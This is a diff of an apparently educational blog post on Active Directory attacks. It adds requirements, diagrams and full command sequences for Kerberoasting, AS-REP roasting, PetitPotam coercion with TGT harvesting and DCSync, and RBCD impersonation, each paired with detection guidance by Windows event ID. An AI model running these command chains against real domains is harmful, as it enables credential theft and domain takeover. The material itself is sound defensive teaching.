@@ -23,11 +23,68 @@ Two things before the techniques. First, none of this assumes you've read a spec
 
 ## Credential Access via Kerberos: Kerberoasting and AS-REP Roasting
 
-**Kerberoasting** gets a full protocol-level treatment, with its own diagram and detection walkthrough, in [Kerberos, NTLM, and the Event IDs That Actually Matter](/posts/kerberos-ntlm-windows-event-ids). The short version: any authenticated domain user can request a service ticket for any account with a registered SPN, and that ticket is encrypted with a key derived from the service account's own password, so it can be taken offline and cracked with zero interaction with the target account. Current tooling: `Rubeus kerberoast`, or `netexec ldap <dc> -u user -p pass --kerberoasting output.txt`, both of which replace the older, clunkier combination of PowerView plus a separate offline formatter.
+**Kerberoasting** gets a full protocol-level treatment, with its own diagram and detection walkthrough, in [Kerberos, NTLM, and the Event IDs That Actually Matter](/posts/kerberos-ntlm-windows-event-ids). The short version: any authenticated domain user can request a service ticket for any account with a registered SPN, and that ticket is encrypted with a key derived from the service account's own password, so it can be taken offline and cracked with zero interaction with the target account.
 
-Ordinary Kerberoasting only reaches accounts that already have an SPN registered, which rules out roasting a privileged account that happens not to run a service. <Term concept="targeted-kerberoasting">Targeted Kerberoasting</Term> removes that restriction: an attacker holding `GenericAll`, `GenericWrite`, `WriteProperty`, or `Validated-SPN` rights on a target account, exactly the kind of ACE Part 1's security descriptor diagram and Part 2's BloodHound tooling are built to surface, writes a throwaway SPN onto that account, requests the now-roastable ticket, and deletes the SPN again immediately after. The account was never running a service and never needed to be; the write access was the only thing missing. Current tooling: `targetedKerberoast.py` (which automates the write, roast, and cleanup in one pass) or NetExec's targeted Kerberoasting support. The write-then-delete pattern on `servicePrincipalName` is itself a detection opportunity distinct from the roast: an SPN appearing and disappearing on an account within seconds, visible in **event 5136**, is a stronger signal than the roast's own RC4 ticket request.
+**Requirements:** any valid domain credential (or a valid TGT already in hand), and at least one account in the domain with a registered SPN, which in most environments is nearly guaranteed since any service account running under a domain identity typically has one.
+
+<div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
+  <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "600px" }} role="img" aria-label="A diagram of the Kerberoasting exchange. An attacker holding a valid TGT sends a TGS-REQ to the KDC naming the SPN of a target service account. The KDC, which never checks whether the requester is allowed to use that service, returns a TGS-REP containing a service ticket encrypted with a key derived from the target account's own password. The attacker takes that ticket offline and cracks it with hashcat.">
+    <rect x="10" y="45" width="130" height="50" rx="7" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="75" y="67" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">Attacker</text>
+    <text x="75" y="80" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">(valid TGT)</text>
+    <rect x="490" y="45" width="140" height="50" rx="7" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="560" y="72" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">KDC (TGS)</text>
+    <line x1="140" y1="58" x2="490" y2="58" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.2" markerEnd="url(#adKerbA)" />
+    <text x="315" y="50" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">TGS-REQ: service ticket for svc_sql's SPN</text>
+    <line x1="490" y1="82" x2="140" y2="82" stroke="#ef4444" strokeOpacity="0.75" strokeWidth="1.3" markerEnd="url(#adKerbB)" />
+    <text x="315" y="100" textAnchor="middle" fill="#ef4444" fontSize="8" opacity="0.9">TGS-REP: ticket encrypted with svc_sql's password hash</text>
+    <rect x="240" y="115" width="160" height="30" rx="6" fill="currentColor" fillOpacity="0.06" stroke="currentColor" strokeWidth="1" strokeOpacity="0.3" strokeDasharray="4 3" />
+    <text x="320" y="134" textAnchor="middle" fill="currentColor" fontSize="8.5" fontWeight="bold">cracked offline, no lockout risk</text>
+    <defs>
+      <marker id="adKerbA" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.55" />
+      </marker>
+      <marker id="adKerbB" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="#ef4444" opacity="0.85" />
+      </marker>
+    </defs>
+  </svg>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>The KDC issues the TGS-REP exactly as Kerberos specifies: it never checks whether svc_sql is a sensible thing for this requester to ask for, only that the requester holds a valid TGT.</p>
+</div>
+
+```bash
+# Impacket, from Linux, dumps every roastable ticket in one pass
+GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request -outputfile hashes.kerberoast
+
+# Rubeus, from a domain-joined Windows host, targeting a single SPN
+Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+# NetExec, roasting every SPN a given credential can see over LDAP
+netexec ldap $DC_IP -u $USER -p $PASSWORD --kerberoasting hashes.kerberoast
+
+# offline cracking, mode 13100 is TGS-REP etype 23 (RC4)
+hashcat -m 13100 hashes.kerberoast rockyou.txt
+```
+
+Ordinary Kerberoasting only reaches accounts that already have an SPN registered, which rules out roasting a privileged account that happens not to run a service. <Term concept="targeted-kerberoasting">Targeted Kerberoasting</Term> removes that restriction: an attacker holding `GenericAll`, `GenericWrite`, `WriteProperty`, or `Validated-SPN` rights on a target account, exactly the kind of ACE Part 1's security descriptor diagram and Part 2's BloodHound tooling are built to surface, writes a throwaway SPN onto that account, requests the now-roastable ticket, and deletes the SPN again immediately after. The account was never running a service and never needed to be; the write access was the only thing missing.
+
+**Requirements:** `GenericAll`, `GenericWrite`, `WriteProperty`, or `Validated-SPN` on the target account's `servicePrincipalName` attribute, which BloodHound reports as an outbound edge from whatever principal the attacker already controls.
+
+```bash
+# writes a throwaway SPN, roasts it, deletes the SPN, in one pass
+targetedKerberoast.py -d $DOMAIN -u $USER -p $PASSWORD --dc-ip $DC_IP
+
+# NetExec's equivalent, against every writable account it finds
+netexec ldap $DC_IP -u $USER -p $PASSWORD --kerberoasting hashes.kerberoast --gen-relay-list
+
+hashcat -m 13100 hashes.kerberoast rockyou.txt
+```
+
+The write-then-delete pattern on `servicePrincipalName` is itself a detection opportunity distinct from the roast: an SPN appearing and disappearing on an account within seconds, visible in **event 5136**, is a stronger signal than the roast's own RC4 ticket request.
 
 **AS-REP Roasting** is the same offline-cracking idea, one protocol step earlier. Normally, the very first message a client sends the KDC (the AS-REQ) includes a timestamp encrypted with a key derived from the user's password, and the KDC only issues an AS-REP (containing a TGT) back if it can decrypt that timestamp correctly, proving the client actually knows the password. This is called pre-authentication, and it's on by default. Some accounts have it explicitly disabled, the `UF_DONT_REQUIRE_PREAUTH` flag on `userAccountControl`, usually left over from compatibility with an old application. For those accounts, the KDC skips the proof entirely and returns an AS-REP to anyone who asks for one by username, no password required to trigger it. That AS-REP is encrypted with a key derived from the target's actual password, so an attacker takes it offline and cracks it exactly like a Kerberoasted ticket, except no credential was needed to obtain it in the first place, only a valid username.
+
+**Requirements:** a list of valid usernames (no password, no domain session needed at all) and at least one of those accounts having `UF_DONT_REQUIRE_PREAUTH` set, which a prior enumeration pass (Part 2) or an anonymous LDAP bind, if allowed, can identify directly.
 
 <div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
   <svg viewBox="0 0 640 230" style={{ width: "100%", maxWidth: "620px" }} role="img" aria-label="Two rows contrasting normal Kerberos pre-authentication with AS-REP Roasting. In the normal row, a client sends an AS-REQ with an encrypted timestamp proving knowledge of the password, and the KDC only returns an AS-REP with a TGT if that timestamp checks out. In the AS-REP Roasting row, an attacker sends an AS-REQ for a username with pre-authentication disabled, no proof of password required, and the KDC immediately returns an AS-REP that the attacker cracks offline.">
@@ -62,7 +119,19 @@ Ordinary Kerberoasting only reaches accounts that already have an SPN registered
   <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>The only difference is one flag on the target account. Everything downstream, offline cracking of a password-derived key, is identical to Kerberoasting.</p>
 </div>
 
-Current tooling: `Rubeus asreproast`, `netexec ldap <dc> -u user -p pass --asreproast output.txt`, or Impacket's `GetNPUsers.py` (still actively maintained under Fortra), all of which will enumerate every no-preauth account and dump crackable hashes in one pass.
+```bash
+# Impacket, sprayed against a wordlist of usernames, no credential required
+GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -format hashcat -outputfile hashes.asrep
+
+# Rubeus, targeting a single known no-preauth account
+Rubeus.exe asreproast /user:$TARGET_USER /format:hashcat /outfile:hashes.asrep
+
+# NetExec, enumerating no-preauth accounts and roasting them in one pass
+netexec ldap $DC_IP -u $USER -p $PASSWORD --asreproast hashes.asrep
+
+# offline cracking, mode 18200 is AS-REP etype 23 (RC4)
+hashcat -m 18200 hashes.asrep rockyou.txt
+```
 
 **Detection.** Both techniques leave a specific fingerprint in the encryption type and volume of Kerberos requests, not in any single request looking wrong. Kerberoasting shows up as a burst of **event 4769** (service ticket requested) for many distinct SPNs from one account in a short window, especially when the encryption type field shows RC4 (`0x17`) instead of AES on an environment that otherwise uses AES, since RC4 is what most cracking tooling still requests by default. AS-REP Roasting shows up as **event 4768** (TGT requested) for an account, with no corresponding pre-authentication success pattern and, again, frequently RC4. Neither is loud on its own; both are exactly the kind of query-volume anomaly Microsoft Defender for Identity is built to baseline and alert on, covered in Part 1's collection points table.
 
@@ -71,6 +140,46 @@ Current tooling: `Rubeus asreproast`, `netexec ldap <dc> -u user -p pass --asrep
 Delegation exists to solve a real problem: a front-end service (a web app, a file server) sometimes needs to act as the user talking to it when it turns around and talks to a second, back-end service, without that user typing their password twice. Kerberos has three ways to do this, and the oldest one is dangerously broad.
 
 **Unconstrained delegation** is a flag on a computer account, `TRUSTED_FOR_DELEGATION`, that says: this server may cache a full copy of the TGT of anyone who authenticates to it, and reuse that TGT to act as them against anything in the domain, not just one back-end service. It predates the more careful delegation models below and still shows up constantly, print servers being the classic, frequently forgotten example. Compromising a machine configured this way means every TGT that ever passed through its LSASS is sitting there for the taking, and an attacker doesn't have to wait: coercion techniques like PetitPotam or the printer bug can force a machine account, or in a worse case a privileged one, to authenticate to an attacker-controlled unconstrained-delegation host on demand.
+
+**Requirements:** administrative access on a host already trusted for delegation (or the ability to stand one up), plus a coercion primitive, an RPC call over MS-EFSRPC (PetitPotam) or MS-RPRN (the printer bug) that can be pointed at a target that hasn't patched or mitigated it, which is most of what makes this attack practical rather than a wait-and-hope.
+
+<div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
+  <svg viewBox="0 0 640 190" style={{ width: "100%", maxWidth: "600px" }} role="img" aria-label="A diagram of the coercion exchange behind unconstrained delegation abuse. The attacker, already controlling a host trusted for delegation, sends a PetitPotam MS-EFSRPC EfsRpcOpenFileRaw call to a domain controller, coercing it to authenticate back to the attacker's host over SMB. The domain controller's machine account authenticates, and its TGT is cached in LSASS on the attacker's host, where Rubeus monitor is already watching for exactly this and extracts it the moment it lands.">
+    <rect x="10" y="20" width="150" height="50" rx="7" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="85" y="42" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">Attacker</text>
+    <text x="85" y="55" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">unconstrained-delegation host</text>
+    <rect x="470" y="20" width="160" height="50" rx="7" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="550" y="42" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">Domain Controller</text>
+    <text x="550" y="55" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">(coercion target)</text>
+    <line x1="160" y1="34" x2="470" y2="34" stroke="#ef4444" strokeOpacity="0.75" strokeWidth="1.3" markerEnd="url(#adCoerceA)" />
+    <text x="315" y="26" textAnchor="middle" fill="#ef4444" fontSize="8" opacity="0.9">PetitPotam: EfsRpcOpenFileRaw(\\attacker-host\share)</text>
+    <line x1="470" y1="58" x2="160" y2="58" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.2" markerEnd="url(#adCoerceB)" />
+    <text x="315" y="76" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.75">DC$ authenticates over SMB, TGT cached in LSASS</text>
+    <rect x="20" y="110" width="600" height="60" rx="7" fill="currentColor" fillOpacity="0.05" stroke="currentColor" strokeWidth="1" strokeOpacity="0.3" strokeDasharray="4 3" />
+    <text x="320" y="134" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">Rubeus monitor was already running on the attacker's host</text>
+    <text x="320" y="152" textAnchor="middle" fill="currentColor" fontSize="8.5" opacity="0.75">it dumps the DC machine account's TGT the moment it lands, no manual polling needed</text>
+    <defs>
+      <marker id="adCoerceA" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="#ef4444" opacity="0.85" />
+      </marker>
+      <marker id="adCoerceB" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.55" />
+      </marker>
+    </defs>
+  </svg>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>A stolen DC machine account TGT is enough to run DCSync directly, skipping every other technique in this post.</p>
+</div>
+
+```bash
+# on the attacker's unconstrained-delegation host, start harvesting before coercing anything
+Rubeus.exe monitor /interval:5 /filteruser:$TARGET$
+
+# force the target (here, a DC) to authenticate back to the attacker's host
+python3 PetitPotam.py -u $USER -p $PASSWORD -d $DOMAIN attacker-host $TARGET_DC
+
+# once the TGT lands, use it directly, e.g. straight into DCSync
+secretsdump.py -k -no-pass $DOMAIN/$TARGET\$@$TARGET_DC -just-dc-ntlm
+```
 
 <div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
   <svg viewBox="0 0 640 250" style={{ width: "100%", maxWidth: "600px" }} role="img" aria-label="A diagram showing a Domain Admin, or a coerced machine account, authenticating to a print server trusted for unconstrained delegation, which caches the full TGT in LSASS. An attacker who compromises that print server extracts the cached TGT and acts as Domain Admin domain-wide.">
@@ -106,32 +215,57 @@ Delegation exists to solve a real problem: a front-end service (a web app, a fil
 
 **Resource-Based Constrained Delegation (RBCD)** is the modern, narrower replacement, and it flips who controls the trust: instead of a front-end server being globally trusted for delegation, the back-end resource itself lists exactly which accounts may delegate to it, in an attribute called `msDS-AllowedToActOnBehalfOfOtherIdentity`. That flip is exactly what makes it abusable in a different way: whoever can write that attribute on a computer object controls who gets to impersonate users against it, and writing it doesn't require domain admin, only `GenericWrite` (or equivalent) on that one computer object, an ACE that's easy to overlook. If the attacker doesn't already control a computer account to name in that attribute, <Term concept="machine-account-quota">machine account quota</Term>, ten by default for any authenticated user, lets them create one.
 
+**Requirements:** `GenericWrite` (or equivalent) on the target computer object, and control of some computer account to name as the delegate, either one already held or one created on the spot via machine account quota.
+
+Setup is two writes, not a protocol exchange: create (or reuse) an attacker-controlled computer account, then set `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer to point at it. What actually moves the identity is the S4U exchange that follows, two request/response pairs against the KDC, and the second one only succeeds because the first attribute write told the KDC to trust it.
+
 <div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
-  <svg viewBox="0 0 640 300" style={{ width: "100%", maxWidth: "600px" }} role="img" aria-label="A five-step vertical chain for Resource-Based Constrained Delegation abuse. Step one, the attacker controls a computer account, via machine account quota or existing write access. Step two, the attacker sets msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer to point at that account. Step three, S4U2Self requests a ticket to itself impersonating the target user. Step four, S4U2Proxy trades that ticket for one to the target computer as the same user. Step five, the KDC issues it and the attacker now acts as that user against the target computer.">
-    <rect x="70" y="10" width="500" height="38" rx="6" fill="#a855f7" fillOpacity="0.1" stroke="#a855f7" strokeWidth="1.2" />
-    <text x="320" y="34" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">1. Attacker controls a computer account (machine account quota, or existing write access)</text>
-    <rect x="70" y="64" width="500" height="38" rx="6" fill="#a855f7" fillOpacity="0.1" stroke="#a855f7" strokeWidth="1.2" />
-    <text x="320" y="88" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">2. Sets msDS-AllowedToActOnBehalfOfOtherIdentity on Target Computer to point at it</text>
-    <rect x="70" y="118" width="500" height="38" rx="6" fill="#a855f7" fillOpacity="0.1" stroke="#a855f7" strokeWidth="1.2" />
-    <text x="320" y="142" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">3. S4U2Self: requests a ticket to itself, impersonating the target user</text>
-    <rect x="70" y="172" width="500" height="38" rx="6" fill="#a855f7" fillOpacity="0.1" stroke="#a855f7" strokeWidth="1.2" />
-    <text x="320" y="196" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">4. S4U2Proxy: trades that ticket for one to Target Computer, as the same user</text>
-    <rect x="70" y="226" width="500" height="38" rx="6" fill="#ef4444" fillOpacity="0.12" stroke="#ef4444" strokeWidth="1.3" />
-    <text x="320" y="250" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">5. KDC issues it: attacker now acts as that user against Target Computer</text>
-    <line x1="320" y1="48" x2="320" y2="64" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adRbcd)" />
-    <line x1="320" y1="102" x2="320" y2="118" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adRbcd)" />
-    <line x1="320" y1="156" x2="320" y2="172" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adRbcd)" />
-    <line x1="320" y1="210" x2="320" y2="226" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adRbcd)" />
+  <svg viewBox="0 0 640 260" style={{ width: "100%", maxWidth: "620px" }} role="img" aria-label="A diagram of the S4U2Self and S4U2Proxy exchange behind Resource-Based Constrained Delegation abuse. The attacker, controlling a computer account already listed on the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity attribute, sends an S4U2Self TGS-REQ to the KDC asking for a ticket to itself impersonating the target user. The KDC returns a TGS-REP containing that ticket, marked forwardable because the attacker's account is trusted for delegation. The attacker then sends an S4U2Proxy TGS-REQ presenting that forwardable ticket as evidence and asking for a service ticket to the target computer. Because the target computer's delegation attribute names the attacker's account, the KDC issues a TGS-REP with a real service ticket to the target computer, impersonating the target user.">
+    <rect x="10" y="20" width="140" height="50" rx="7" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="80" y="42" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">Attacker</text>
+    <text x="80" y="55" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">controls delegate account</text>
+    <rect x="490" y="20" width="140" height="50" rx="7" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="560" y="47" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">KDC</text>
+    <line x1="150" y1="34" x2="490" y2="34" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.2" markerEnd="url(#adS4uA)" />
+    <text x="320" y="27" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">1. S4U2Self TGS-REQ: ticket to self, impersonating target user</text>
+    <line x1="490" y1="58" x2="150" y2="58" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.2" markerEnd="url(#adS4uA)" />
+    <text x="320" y="76" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">2. TGS-REP: forwardable ticket, since the delegate is trusted</text>
+    <rect x="10" y="130" width="140" height="50" rx="7" fill="#ef4444" fillOpacity="0.14" stroke="#ef4444" strokeWidth="1.3" />
+    <text x="80" y="152" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">Attacker</text>
+    <text x="80" y="165" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.75">now holds forwardable ticket</text>
+    <rect x="490" y="130" width="140" height="50" rx="7" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="560" y="157" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">KDC</text>
+    <line x1="150" y1="144" x2="490" y2="144" stroke="#ef4444" strokeOpacity="0.75" strokeWidth="1.3" markerEnd="url(#adS4uB)" />
+    <text x="320" y="137" textAnchor="middle" fill="#ef4444" fontSize="8" opacity="0.9">3. S4U2Proxy TGS-REQ: presents that ticket, asks for Target Computer</text>
+    <line x1="490" y1="168" x2="150" y2="168" stroke="#ef4444" strokeOpacity="0.75" strokeWidth="1.3" markerEnd="url(#adS4uB)" />
+    <text x="320" y="186" textAnchor="middle" fill="#ef4444" fontSize="8" opacity="0.9">4. TGS-REP: real service ticket to Target Computer, as the target user</text>
+    <rect x="200" y="210" width="240" height="34" rx="6" fill="currentColor" fillOpacity="0.06" stroke="currentColor" strokeWidth="1" strokeOpacity="0.3" strokeDasharray="4 3" />
+    <text x="320" y="231" textAnchor="middle" fill="currentColor" fontSize="8.5" fontWeight="bold">only step 4 checks msDS-AllowedToActOnBehalfOfOtherIdentity</text>
     <defs>
-      <marker id="adRbcd" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
-        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.5" />
+      <marker id="adS4uA" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.55" />
+      </marker>
+      <marker id="adS4uB" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="#ef4444" opacity="0.85" />
       </marker>
     </defs>
   </svg>
-  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>S4U2Self and S4U2Proxy are legitimate Kerberos extensions built for exactly this kind of delegated request. Nothing here is a protocol bug.</p>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>S4U2Self and S4U2Proxy are legitimate Kerberos extensions built for exactly this kind of delegated request. Nothing here is a protocol bug: the KDC does exactly what the delegation attribute told it to trust.</p>
 </div>
 
-Current tooling: Impacket's `addcomputer.py` (to create the attacker-controlled computer account) and `rbcd.py` (to set the delegation attribute), then Rubeus's `s4u` module (or Impacket's `getST.py`) to run the S4U2Self/S4U2Proxy chain and retrieve the final ticket.
+```bash
+# create an attacker-controlled computer account, using machine account quota
+addcomputer.py -computer-name 'ATTACKERPC$' -computer-pass 'Passw0rd!' $DOMAIN/$USER:$PASSWORD
+
+# point Target Computer's delegation attribute at that account
+rbcd.py -action write -delegate-from 'ATTACKERPC$' -delegate-to 'TARGETPC$' $DOMAIN/$USER:$PASSWORD
+
+# run the S4U2Self/S4U2Proxy chain and retrieve the final service ticket
+getST.py -spn cifs/targetpc.$DOMAIN -impersonate $TARGET_USER -dc-ip $DC_IP $DOMAIN/'ATTACKERPC$':'Passw0rd!'
+
+# equivalent, from Windows, with Rubeus
+Rubeus.exe s4u /user:ATTACKERPC$ /rc4:$NTHASH /impersonateuser:$TARGET_USER /msdsspn:cifs/targetpc.$DOMAIN /ptt
+```
 
 **Detection.** Unconstrained delegation abuse is best caught before it happens: alert on any change that sets `TRUSTED_FOR_DELEGATION` on a computer object (a `userAccountControl` change visible in **event 4738**, or the underlying attribute change in **event 5136**), and watch for coercion attempts, which Microsoft Defender for Identity has dedicated detections for. RBCD abuse leaves two distinct signals: a write to `msDS-AllowedToActOnBehalfOfOtherIdentity` itself (**event 5136**, if a SACL is configured on the object, since as covered in Part 1 this requires deliberate auditing setup) and, often the earlier tell, a burst of new computer account creation (**event 4741**) from a single user account exhausting or approaching its machine account quota.
 
@@ -141,32 +275,42 @@ Windows Hello for Business needs a way to authenticate a user with a public key 
 
 The detail worth sitting with: this technique doesn't require Active Directory Certificate Services to be deployed at all. It uses the Key Trust model, which needs only a domain controller running Windows Server 2016 or later with a server authentication certificate (something most DCs already have for LDAPS) and the domain at the 2016 functional level. That's a much lower bar than most people assume, and it's why write access to this one attribute deserves the same weight as write access to a password reset right during an ACL review.
 
+**Requirements:** `GenericWrite`, `GenericAll`, or `WriteProperty` on `msDS-KeyCredentialLink` for the target account, plus a DC at Windows Server 2016 or later and the domain at the 2016 functional level (both true in the overwhelming majority of current environments).
+
 <div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
-  <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "600px" }} role="img" aria-label="A four-step horizontal chain: write access to msDS-KeyCredentialLink on a target account, adding an attacker-controlled shadow credential, authenticating via PKINIT with that credential, and receiving back a valid TGT plus the account's NTLM hash with no password required.">
-    <rect x="10" y="60" width="140" height="50" rx="7" fill="#a855f7" fillOpacity="0.12" stroke="#a855f7" strokeWidth="1.2" />
-    <text x="80" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Write access to</text>
-    <text x="80" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">KeyCredentialLink</text>
-    <rect x="180" y="60" width="140" height="50" rx="7" fill="#a855f7" fillOpacity="0.12" stroke="#a855f7" strokeWidth="1.2" />
-    <text x="250" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Add attacker</text>
-    <text x="250" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">shadow credential</text>
-    <rect x="350" y="60" width="140" height="50" rx="7" fill="#a855f7" fillOpacity="0.12" stroke="#a855f7" strokeWidth="1.2" />
-    <text x="420" y="88" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">PKINIT auth with that key</text>
-    <rect x="520" y="60" width="110" height="50" rx="7" fill="#ef4444" fillOpacity="0.12" stroke="#ef4444" strokeWidth="1.3" />
-    <text x="575" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">TGT + NT hash</text>
-    <text x="575" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">no password used</text>
-    <line x1="150" y1="85" x2="180" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adShadow)" />
-    <line x1="320" y1="85" x2="350" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adShadow)" />
-    <line x1="490" y1="85" x2="520" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adShadow)" />
+  <svg viewBox="0 0 640 160" style={{ width: "100%", maxWidth: "600px" }} role="img" aria-label="A diagram of the PKINIT exchange behind Shadow Credentials abuse. After the attacker writes a self-generated public key onto the target account's msDS-KeyCredentialLink attribute, the attacker sends an AS-REQ signed with the corresponding private key instead of a password-derived timestamp. The KDC validates the signature against the key it finds on the account and returns an AS-REP containing a TGT for the target account, along with the account's NT hash embedded in the PAC for compatibility, all without the account's actual password ever being involved.">
+    <rect x="10" y="45" width="150" height="50" rx="7" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="85" y="67" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">Attacker</text>
+    <text x="85" y="80" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">holds the private key</text>
+    <rect x="480" y="45" width="150" height="50" rx="7" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="555" y="67" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">KDC</text>
+    <text x="555" y="80" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">sees the public key on the account</text>
+    <line x1="160" y1="58" x2="480" y2="58" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.2" markerEnd="url(#adShadowA)" />
+    <text x="320" y="50" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">PKINIT AS-REQ: signed with the private key, no password</text>
+    <line x1="480" y1="82" x2="160" y2="82" stroke="#ef4444" strokeOpacity="0.75" strokeWidth="1.3" markerEnd="url(#adShadowB)" />
+    <text x="320" y="100" textAnchor="middle" fill="#ef4444" fontSize="8" opacity="0.9">AS-REP: TGT for the target account, plus its NT hash</text>
+    <rect x="180" y="115" width="280" height="30" rx="6" fill="currentColor" fillOpacity="0.06" stroke="currentColor" strokeWidth="1" strokeOpacity="0.3" strokeDasharray="4 3" />
+    <text x="320" y="134" textAnchor="middle" fill="currentColor" fontSize="8.5" fontWeight="bold">the account's real password is never touched or checked</text>
     <defs>
-      <marker id="adShadow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
-        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.5" />
+      <marker id="adShadowA" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.55" />
+      </marker>
+      <marker id="adShadowB" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="#ef4444" opacity="0.85" />
       </marker>
     </defs>
   </svg>
